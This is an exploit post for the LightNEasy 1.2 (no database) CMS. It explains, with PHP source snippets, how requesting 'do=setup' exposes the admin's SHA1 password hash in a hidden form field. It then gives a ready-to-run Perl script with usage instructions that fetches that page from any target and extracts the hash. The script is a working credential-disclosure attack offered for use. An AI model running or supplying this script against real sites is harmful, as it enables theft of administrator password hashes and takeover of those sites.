LightNEasy 1.2 (no database) Remote Hash Retrieve Exploit
=========================================================



# Author:	__GiReX__
# Date:		10/04/08

# CMS: 		LightNEasy 1.2 no database
# Site:		lightneasy.org

# Bug:		Hash Disclosure
# Exploit:	Remote Hash Retrieve


# Bug Explanation: LightNEasy/lightneasy.php

  if($_GET[&#039;do&#039;]!="login" && $_GET[&#039;do&#039;]!="sitemap" && $_SESSION[$set[&#039;password&#039;]] != "1") unset($_GET[&#039;do&#039;]);
  if($_POST[&#039;submit&#039;]!=$langmessage[120] && $_POST[&#039;submit&#039;]!=$langmessage[33] && $_SESSION[$set[&#039;password&#039;]] != "1")
	unset($_POST[&#039;submit&#039;]);

# $_GET[&#039;do&#039;] is unset if we aren&#039;t admin or isn&#039;t login or sitemap

  function content() {
  ...
  switch($_REQUEST[&#039;do&#039;]) {
  ...
  case "setup": {
  ...
  <input type=\"hidden\" name=\"oldpassword\" value=\"".$set[&#039;password&#039;]."\" />

# content() diplays the HTML of the section passed with $_REQUEST[&#039;do&#039;]
# unset $_GET[&#039;do&#039;] is not important if you switch the $_REQUEST one
# you can only see the admin&#039;s hash in hidden input and not edit it becouse $_POST[&#039;submit&#039;] is unset


#!/usr/bin/perl -w
use strict;
use LWP::UserAgent;

if(not defined $ARGV[0])
{
     banner();
     print "[-] Usage: perl $0 [host] [path]\n";
     print "[-] Example: perl $0 localhost /lightneasy/\n\n";
     exit;
}
my $client = new LWP::UserAgent or exit;

my $target  =  $ARGV[0] =~ /^http:\/\// ?  $ARGV[0]:  &#039;http://&#039; . $ARGV[0];
   $target .=  $ARGV[1] unless not defined $ARGV[1];

banner();
my $response = $client->get($target . &#039;LightNEasy.php?do=setup&#039;);

if($response->is_success)
{
     if($response->as_string =~ /([a-f0-9]{40})/)
     {
	  print "[+] Admin&#039;s SHA1 Hash: $1 \n";
	  print "[+] Exploit Successfull\n";
     }
     else 
     {
	  print "[-] Unable to retrieve admin&#039;s hash\n";
	  print "[-] Exploit Failed\n";
     }
}
else
{
     print "[-] Unable to request ${target}LightNEasy.php?do=setup\n";
     print "[-] Exploit Failed\n";
}


sub banner
{
     print "[+] LightNEasy 1.2 no database Password Retrieve Exploit\n";
     print "[+] Coded by __GiReX__\n";
     print "\n";
}



